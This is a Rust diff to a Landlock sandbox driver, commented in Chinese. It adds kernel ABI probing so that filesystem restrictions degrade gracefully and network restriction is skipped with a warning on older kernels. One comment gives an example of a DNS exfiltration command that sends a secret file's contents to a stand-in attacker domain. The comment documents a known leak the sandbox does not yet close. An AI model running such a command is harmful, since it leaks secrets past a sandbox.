@@ -15,6 +15,14 @@
 //! 探测进程）。内核 < 5.13 或 Landlock 未启用时返回 `false`，`detect_driver()`
 //! 据此降级 `NoopDriver` + warn（C-22）。
 //!
+//! **分级降级（SEC-2，2026-08-25 R2 审查）**：5.13 ≤ 内核 < 6.7 时，FS 限制按
+//! 实际支持的 ABI 生效（V1/V2/V3 逐级试探，`build_ruleset` 只 handle 探测通过
+//! 的访问集），网络 TCP 拒绝（需 ABI≥4）自动跳过并 warn——此前 ruleset 以
+//! BestEffort 同时 handle FS(V3)+Net(ABI4)，pre_exec 对 `PartiallyEnforced`
+//! 直接报错，导致这些内核**每次 spawn 必失败**并把用户推向关闭沙箱。现在：
+//! 全部 handle 均为探测确认可全量执行的能力，pre_exec 的 `FullyEnforced`
+//! 严格校验保持成立（fail-closed 不变式不放松）。
+//!
 //! ## VCS 保护限制
 //!
 //! Landlock 规则是"白名单并集"语义：workdir 可写会让其下 `.git` 也继承可写
@@ -29,10 +37,6 @@ use landlock::{RulesetAttr, RulesetCreatedAttr};
 use minicoding_core::sandbox::{SandboxDriver, SandboxError, SandboxPolicy};
 use std::os::unix::process::CommandExt;
 use std::path::PathBuf;
-
-/// Landlock ABI 上限（V3 = Linux 6.2，含 Truncate，覆盖 `std::fs::write` 等常见写操作）。
-/// `BestEffort` 兼容模式下自动降到内核实际支持版本。
-const TARGET_ABI: landlock::ABI = landlock::ABI::V3;
 
 /// 只读放行的系统路径（命令/库/设备/proc 必须可读，否则子进程无法 exec）。
 const SYSTEM_RO_PATHS: &[&str] = &[
@@ -104,6 +108,44 @@ pub fn landlock_available() -> bool {
         .is_some()
 }
 
+/// 探测内核实际支持的 Landlock FS ABI（SEC-2 分级降级）。
+///
+/// 从高到低逐级 `HardRequirement` 试探 V3/V2/V1，返回最高可用版本；全不支持
+/// 返回 `None`（调用方应走 `NoopDriver` 路径）。探测仅 create ruleset 不约束
+/// 当前进程。`pub` 供 doctor 如实报告（此前固定宣称 "V3 target ABI" 与实际
+/// 执行的 ABI 不符）。
+#[must_use]
+pub fn probe_fs_abi() -> Option<landlock::ABI> {
+    use landlock::{Access, CompatLevel, Compatible, Ruleset};
+
+    for abi in [landlock::ABI::V3, landlock::ABI::V2, landlock::ABI::V1] {
+        let ok = Ruleset::default()
+            .set_compatibility(CompatLevel::HardRequirement)
+            .handle_access(landlock::AccessFs::from_all(abi))
+            .ok()
+            .and_then(|r| r.create().ok())
+            .is_some();
+        if ok {
+            return Some(abi);
+        }
+    }
+    None
+}
+
+/// 探测内核是否支持 Landlock 网络原语（ABI≥4 / Linux 6.7+，SEC-2）。
+/// `pub` 供 doctor 如实报告网络限制可用性。
+#[must_use]
+pub fn net_restriction_supported() -> bool {
+    use landlock::{CompatLevel, Compatible, Ruleset};
+
+    Ruleset::default()
+        .set_compatibility(CompatLevel::HardRequirement)
+        .handle_access(landlock::AccessNet::BindTcp | landlock::AccessNet::ConnectTcp)
+        .ok()
+        .and_then(|r| r.create().ok())
+        .is_some()
+}
+
 /// 在子进程 `pre_exec` 内应用 Landlock 限制。
 ///
 /// 父进程构建 `RulesetCreated`（打开 `PathFd`、`add_rule`），子进程 `pre_exec` 内仅
@@ -150,16 +192,37 @@ fn apply_landlock(
 /// - `WorkspaceWrite`：workdir + writable 可写，其余只读，VCS 目录列入只读
 ///   （注：landlock 并集语义下 workdir 可写会使 .git 继承可写，VCS 实际写保护
 ///   由应用层 builtin 黑名单补充（S5 已落地），见模块文档）。
+#[allow(clippy::too_many_lines)] // 策略分解+SEC-2 分级降级注释与规则添加线性展开，拆分降低可读性
 fn build_ruleset(policy: &SandboxPolicy) -> Result<landlock::RulesetCreated, SandboxError> {
     use landlock::{Access, path_beneath_rules};
 
-    let handled = landlock::AccessFs::from_all(TARGET_ABI);
-    let ro_access = landlock::AccessFs::from_read(TARGET_ABI);
-    let write_access = landlock::AccessFs::from_all(TARGET_ABI);
+    // SEC-2 分级降级：只 handle 探测确认可全量执行的访问集。FS 按实际支持
+    // ABI；网络仅在内核支持（ABI≥4）时启用——否则 BestEffort 静默降级会让
+    // pre_exec 的 FullyEnforced 校验失败（PartiallyEnforced），spawn 必败。
+    let fs_abi = probe_fs_abi().ok_or_else(|| {
+        SandboxError::Sandbox("landlock FS 限制不可用（应先经 landlock_available 探测）".into())
+    })?;
+    let restrict_net_requested = matches!(
+        policy,
+        SandboxPolicy::ReadOnly | SandboxPolicy::WorkspaceWrite { .. }
+    );
+    let net_supported = net_restriction_supported();
+    if restrict_net_requested && !net_supported {
+        tracing::warn!(
+            "landlock network restriction unavailable on this kernel \
+             (requires ABI>=4 / Linux 6.7+): child TCP/UDP/DNS are NOT restricted; \
+             seccomp pending (tech-stack.md §13)"
+        );
+    }
+    let restrict_net = restrict_net_requested && net_supported;
+
+    let handled = landlock::AccessFs::from_all(fs_abi);
+    let ro_access = landlock::AccessFs::from_read(fs_abi);
+    let write_access = landlock::AccessFs::from_all(fs_abi);
 
     // 网络限制（2026-08-23 审查遗留#1，security.md §8 核心支柱）：
     // ReadOnly/WorkspaceWrite 下拒绝子进程 TCP bind/connect（landlock ABI≥4，
-    // Linux 6.7+；旧内核 Compatible 模式自动忽略该 handle——best-effort）。
+    // Linux 6.7+；旧内核经上方探测自动跳过并 warn——SEC-2 分级降级）。
     // 不为网络添加任何 allow 规则 = 全部拒绝。web.fetch 在主进程内执行不受
     // 影响（沙箱只作用于 spawn 的子进程）；需要子进程联网用 external-sandbox/
     // danger-full-access。
@@ -169,10 +232,6 @@ fn build_ruleset(policy: &SandboxPolicy) -> Result<landlock::RulesetCreated, San
     // 进程仍可用 DNS 查询（`dig $(cat secret).evil.com`）或任意 UDP 报文对外
     // 通信。彻底封堵需 seccomp（待接入，见 tech-stack.md §13）；在 seccomp
     // 落地前，doctor 与文档必须如实描述该残留通道。
-    let restrict_net = matches!(
-        policy,
-        SandboxPolicy::ReadOnly | SandboxPolicy::WorkspaceWrite { .. }
-    );
     let mut ruleset = make_base_ruleset(handled, restrict_net)?
         .create()
         .map_err(|e| SandboxError::Sandbox(e.to_string()))?;
@@ -285,8 +344,10 @@ fn build_ruleset(policy: &SandboxPolicy) -> Result<landlock::RulesetCreated, San
 
 /// 构造基础 Ruleset：fs handle 全量 + 可选 TCP 网络拒绝（`restrict_net`）。
 ///
-/// 网络拒绝语义见 [`build_ruleset`] 内注释——landlock 仅支持 TCP 原语，
-/// UDP/DNS 残留通道由 seccomp（待接入）封堵。
+/// `restrict_net` 由调用方经 [`net_restriction_supported`] 探测后决定（SEC-2），
+/// 本函数不再做 `BestEffort` 静默降级——所有 handle 均可全量执行，保证
+/// `restrict_self()` 返回 `FullyEnforced`。网络仅覆盖 TCP 原语，UDP/DNS 残留
+/// 通道由 seccomp（待接入）封堵。
 fn make_base_ruleset(
     handled: landlock::BitFlags<landlock::AccessFs>,
     restrict_net: bool,
@@ -315,6 +376,24 @@ mod tests {
     fn landlock_available_does_not_panic() {
         // 仅验证探测函数可调用、不 panic；实际 true/false 取决于内核
         let _ = landlock_available();
+    }
+
+    #[test]
+    fn probe_fs_abi_matches_availability() {
+        // SEC-2：landlock_available()（V1 探测）为真时，probe_fs_abi 必须返回
+        // Some（至少 V1 可用）；为假时两者应一致为不支持。
+        let available = landlock_available();
+        assert_eq!(
+            probe_fs_abi().is_some(),
+            available,
+            "probe_fs_abi 与 landlock_available 探测结论不一致"
+        );
+    }
+
+    #[test]
+    fn net_probe_does_not_panic() {
+        // 实际 true/false 取决于内核（ABI>=4）；仅验证可调用、不 panic
+        let _ = net_restriction_supported();
     }
 
     #[test]
